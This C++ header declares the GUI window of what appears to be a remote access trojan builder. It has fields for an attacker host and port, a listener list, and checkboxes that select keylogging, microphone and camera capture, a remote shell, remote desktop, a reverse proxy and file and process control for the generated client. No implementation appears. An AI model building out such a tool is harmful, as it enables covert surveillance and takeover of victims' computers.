#ifndef __FRAME_BUILDER
#define __FRAME_BUILDER

#include "server.hpp"
#include "headers.hpp"

namespace EnumBuilderIDS {
	enum Enum {
		BTN_Generar = 10,
		BTN_RefListeners,
		CMB_Listeners
	};
}

class MyProcess;

class FrameBuilder : public wxFrame {
public:
	FrameBuilder(wxWindow*);
private:
	bool isDone1 = false;
	bool isError = false;
	HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
	PROCESS_INFORMATION pi;
	STARTUPINFOA  si;
	std::thread tRead;
	std::thread tRead2;
	std::string strClave = "";

	wxTextCtrl* txtHost = nullptr;
	wxTextCtrl* txtPort = nullptr;
	wxTextCtrl* txtOutput = nullptr;

	wxCheckBox* chkShell = nullptr;
	wxCheckBox* chkKeylogger = nullptr;
	wxCheckBox* chkMic = nullptr;
	wxCheckBox* chkCam = nullptr;
	wxCheckBox* chkRemoteDesk = nullptr;
	wxCheckBox* chkReverseProxy = nullptr;
	wxCheckBox* chkNetScan = nullptr;
	wxCheckBox* chkAdmArchivos = nullptr;
	wxCheckBox* chkAdmProcesos = nullptr;
	wxCheckBox* chkAdmVentanas = nullptr;
	wxCheckBox* chkInformacion = nullptr;
	wxCheckBox* chkBromas = nullptr;
	wxCheckBox* chkDebug = nullptr;



	//Listeners
	wxComboBox* cmbListeners = nullptr;
	std::vector<Listener_List_Data> vc_listeners;
	wxButton* btnRefListeners = nullptr;

	wxButton* btnGenerar = nullptr;

	void OnGenerarCliente(wxCommandEvent& event);
	void OnRefListeners(wxCommandEvent& event);
	void OnCambioListener(wxCommandEvent& event);

	void RefrescarLista();

	void thLeerShell(HANDLE hPipe);
	void thLeerShell2(std::string strCmd);

	wxDECLARE_EVENT_TABLE();
};



#endif
